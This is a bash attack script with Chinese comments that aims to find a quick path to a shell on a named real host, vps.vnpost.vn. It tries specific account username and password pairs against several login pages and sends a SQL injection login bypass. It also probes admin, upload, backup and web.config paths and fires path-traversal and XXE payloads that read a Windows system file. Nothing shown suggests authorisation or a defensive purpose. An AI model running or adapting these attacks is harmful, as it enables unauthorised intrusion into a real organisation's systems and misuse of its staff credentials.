#!/bin/bash

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🚀 快速测试所有系统 - 寻找GetShell最快路径"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[1] COS系统（ASP老系统 - 可能SQL注入）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

COS_BASE="http://vps.vnpost.vn/cos"

echo "  测试账号: khanhvm.vckv:123456"
# ASP登录通常是简单的POST
resp=$(curl -sk "${COS_BASE}/Login.asp" \
    -X POST \
    --data "username=khanhvm.vckv&password=123456&login=Login" \
    -c cos_cookie.txt \
    -L -w "%{http_code}" 2>&1)

http_code=$(echo "$resp" | tail -1)
echo "  HTTP状态: $http_code"

if [ "$http_code" == "200" ]; then
    # 检查响应
    content=$(echo "$resp" | head -100)
    if echo "$content" | grep -qi "welcome\|admin\|dashboard\|logout"; then
        echo "  ✅ 可能登录成功！"
        echo "$content" | head -30
    else
        echo "  ⚠️  需要验证"
    fi
fi

# 测试SQL注入（ASP经典漏洞）
echo ""
echo "  测试SQL注入..."
curl -sk "${COS_BASE}/Login.asp" \
    -X POST \
    --data "username=admin' or '1'='1&password=x&login=Login" \
    -w "\n状态码: %{http_code}\n" | head -50

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[2] LUONG系统"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

LUONG_BASE="http://vps.vnpost.vn/luong"

# 测试多个账号
LUONG_ACCOUNTS=("KVMTTCVP:123" "KVMTNVNV:123" "KVMTLDGD:123")

for account in "${LUONG_ACCOUNTS[@]}"; do
    IFS=':' read user pass <<< "$account"
    echo ""
    echo "  测试: $user:$pass"
    
    # 获取ViewState
    page=$(curl -sk "${LUONG_BASE}/Login.aspx" 2>&1)
    VS=$(echo "$page" | grep -oE '__VIEWSTATE" value="[^"]+' | cut -d'"' -f3)
    
    if [ -z "$VS" ]; then
        echo "    ⚠️  无法获取ViewState"
        continue
    fi
    
    # 登录
    resp=$(curl -sk "${LUONG_BASE}/Login.aspx" \
        -X POST \
        --data-urlencode "__VIEWSTATE=$VS" \
        --data-urlencode "txtUser=$user" \
        --data-urlencode "txtPass=$pass" \
        --data-urlencode "btnLogin=Login" \
        -c "luong_${user}.txt" \
        -L 2>&1)
    
    size=$(echo "$resp" | wc -c)
    echo "    响应大小: $size bytes"
    
    if echo "$resp" | grep -qi "logout\|welcome\|default.aspx"; then
        echo "    ✅ 可能登录成功！"
        echo "$resp" | grep -i "welcome\|user\|admin" | head -5
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[3] 未授权访问测试"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 常见敏感路径
SENSITIVE_PATHS=(
    "/vckv/admin/"
    "/vckv/upload/"
    "/vckv/backup/"
    "/luong/admin/"
    "/luong/upload/"
    "/chamcong/admin/"
    "/cos/admin/"
    "/cos/backup/"
    "/web.config"
    "/Web.config"
)

echo "  测试未授权访问..."
for path in "${SENSITIVE_PATHS[@]}"; do
    resp=$(curl -sk "http://vps.vnpost.vn${path}" -w "%{http_code}" -o /dev/null 2>&1)
    
    if [ "$resp" == "200" ] || [ "$resp" == "301" ] || [ "$resp" == "302" ]; then
        echo "    🔥 $path: $resp"
    fi
done

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
echo ""
echo "[4] 快速漏洞扫描（高价值目标）"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

# 文件包含测试
echo "  测试文件包含..."
curl -sk "http://vps.vnpost.vn/cos/index.asp?page=../../../../windows/win.ini" | \
    grep -i "font\|extension" && echo "    🔥🔥🔥 文件包含漏洞！"

# XXE测试
echo "  测试XXE..."
curl -sk "http://vps.vnpost.vn/vckv/api/data" \
    -X POST \
    -H "Content-Type: application/xml" \
    --data '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>' | \
    grep -i "font\|extension" && echo "    🔥🔥🔥 XXE漏洞！"

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "✅ 快速扫描完成"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
